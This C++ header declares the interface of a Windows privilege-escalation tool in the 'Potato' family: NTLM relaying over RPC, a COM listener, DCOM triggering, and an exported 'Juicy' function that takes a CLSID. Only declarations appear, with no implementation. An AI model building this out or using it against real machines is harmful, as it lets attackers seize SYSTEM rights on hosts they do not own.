#include "Objidl.h"
#include "BlockingQueue.h"
#include "LocalNegotiator.h"
#include <winsock2.h>

class PotatoAPI {
private:
	BlockingQueue<char*>* comSendQ;
	BlockingQueue<char*>* rpcSendQ;
	static DWORD WINAPI staticStartRPCConnection(void * Param);
	static DWORD WINAPI staticStartCOMListener(void * Param);
	static int newConnection;
	int processNtlmBytes(char* bytes, int len);
	int findNTLMBytes(char * bytes, int len);

public:
	PotatoAPI(void);
	int startRPCConnection(void);
    DWORD startRPCConnectionThread();
	DWORD startCOMListenerThread();
	int startCOMListener(void);
	int triggerDCOM();
	LocalNegotiator *negotiator;
	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;
	SOCKET ConnectSocket = INVALID_SOCKET;
};

__declspec(dllexport) void EntryPoint(void);
__declspec(dllexport) int Juicy(wchar_t *clsid, BOOL brute);
